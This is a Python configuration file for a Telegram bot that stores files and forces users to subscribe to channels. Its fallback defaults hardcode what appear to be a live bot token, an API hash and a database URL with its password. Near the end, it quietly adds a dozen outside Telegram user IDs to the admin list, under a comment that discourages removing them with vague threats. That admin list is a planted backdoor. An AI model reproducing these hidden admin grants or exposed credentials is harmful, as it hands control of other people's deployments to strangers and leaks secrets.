
import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token from @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "1515048677:AAHpG43hfts9fg6Cpnd572XVXUjyNx612ik")

# API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "1161985"))

# API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "6dc154cfac22dab52e6ae4fd0fe55a3b")

# Channel ID for the database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001985859676"))

# Owner's name
OWNER = os.environ.get("OWNER", "5415119496")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku credentials for updater
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom repository for updater
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgresql://sharmaji_jfmo_user:1hKUkT4MlmIRQNSpNkvETRO7aB0aGhI9@dpg-cuo9cstds78s738h7jhg-a.oregon-postgres.render.com/sharmaji_jfmo")

# ID of the channel or group for mandatory subscription
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1002097796598"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1002003319470"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Initial /start message
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>I can store private files in specific channels, and others can access them through unique links.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Your admin list contains invalid Telegram User IDs.")

# Message shown when forcing subscription
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>You must join my channel/group first to access the files I share.</b>\n\n<b>Please join the channel and group first.</b>",
)

# Set your custom text here. Set to (None) to disable custom text
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Set to True if you want to disable the share button for your channel posts
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Do not delete; removing the IDs below may cause errors.
# Consequence spoiler: Your channel may disappear, and the owner might get banned 🤪
ADMINS.extend((816300798, 1467110873, 1003202409, 5415119496,5415119496,
6378652263,
8104192293,
6486811381,
935709830,
1926591295,
5910540794,
6750277821,
1467110873,))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
